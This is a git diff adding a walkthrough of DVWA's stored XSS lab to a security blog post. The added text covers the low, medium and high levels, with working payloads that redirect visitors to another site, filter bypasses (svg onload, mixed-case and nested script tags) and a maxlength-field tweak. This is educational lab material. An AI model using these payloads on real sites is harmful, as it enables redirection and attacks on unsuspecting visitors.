@@ -42,14 +42,79 @@ The **stored XSS is stored in the database**. The **stored XSS is permanent**, u
 ## Security: Low
 > _Low level will not check the requested input, before including it to be used in the output text. ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_stored/xss_stored_low_source.php))._
 
+1. There are 2 input fields: `Name` and `Message`. Let's start with something simple to see if it works:
+
+    ```javascript
+    <script>alert("XSS")</script>
+    ```
+
+    ![](low_test.png)
+
+2. Let's try the payload we used in both previous sections, [DOM](https://cspanias.github.io/posts/DVWA-XSS-(DOM)/) and [Reflected](https://cspanias.github.io/posts/DVWA-XSS-(Reflected)/) XSS, but this time instead of stealing the cookie we will redirect the users to another site:
+
+    ```javascript
+    <script>window.location='https://cspanias.github.i
+    ```
+
+3. So it seems that a character limit is set for both fields that does not allows us to input our payload. We can modify the character length as follows:
+
+    ![](max_length.png)
+
+    The `maxlength` is set to 50 characters, so let's change that to 250:
+
+    ![](max_length_250.png)
+
+4. Let's try inserting our payload again:
+
+    ```javascript
+    <script>window.location='https://cspanias.github.io/'</script>
+    ```
+
+    Once we press enter:
+
+    ![](low_redirection.png)
+
+    Now, if you go back to DVWA home, and you click on the `XSS (Stored)` tab, you will automatically be redirected to https://cspanias.github.io.
+
+5. For clearing the guestbook, we need to go to the DVWA homepage and change the security level to Impossible. Once that is done, we can safely go to the XSS (Stored) tab and clear the guestbook:
+
+    ![](clear_guestbook_1.png)
+
+    ![](clear_guestbook_2.png)
 
 ## Security: Medium
 > _The developer had added some protection, however hasn't done every field the same way ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_stored/xss_stored_medium_source.php))._
 
+1. This time the developer has put a great effort in sanitizing the `Message` field, but not so much the `Name` field. For the latter, it is just removing the `<script>` tag, so we can try any of the methods used on the [XSS (Reflected)](https://cspanias.github.io/posts/DVWA-XSS-(Reflected)/#security-medium) task, after first changing the field's `maxlength`:
 
+    ![](medium_max_length.png)
+
+    ```javascript
+    <svg/onload=window.location='https://cspanias.github.io/'>
+    ```
+
+    ```javascript
+    <SCRIPT>window.location='https://cspanias.github.io/'</script>
+    ```
+
+    ```javascript
+    <scr<script>ipt>window.location='https://cspanias.github.io/'</script>
+    ```
+
+    ![](low_redirection.png)
+    
 ## Security: High
 > _The developer believe they have disabled all script usage by removing the pattern `<s*c*r*i*p*t` ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_stored/xss_stored_high_source.php))._
 
+1. This time the developer changed the blacklisted pattern to `<s*c*r*i*p*t`, exactly like the High level of the [XSS (Reflected)](https://cspanias.github.io/posts/DVWA-XSS-(Reflected)/#security-medium) task. This blocks our last two attacks that include the `<script>` tag, but not the first one:
+
+    ```javascript
+    <svg/onload=window.location='https://cspanias.github.io/'>
+    ```
+
+    ![](low_redirection.png)
+
+    > Don't forget to increase the value of the `maxlength` variable.
 
 ## Security: Impossible
 > _Using inbuilt PHP functions, such as [`htmlspecialchars()`](https://secure.php.net/manual/en/function.htmlspecialchars.php), its possible to escape any values which would alter the behaviour of the input ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_stored/xss_stored_impossible_source.php))._
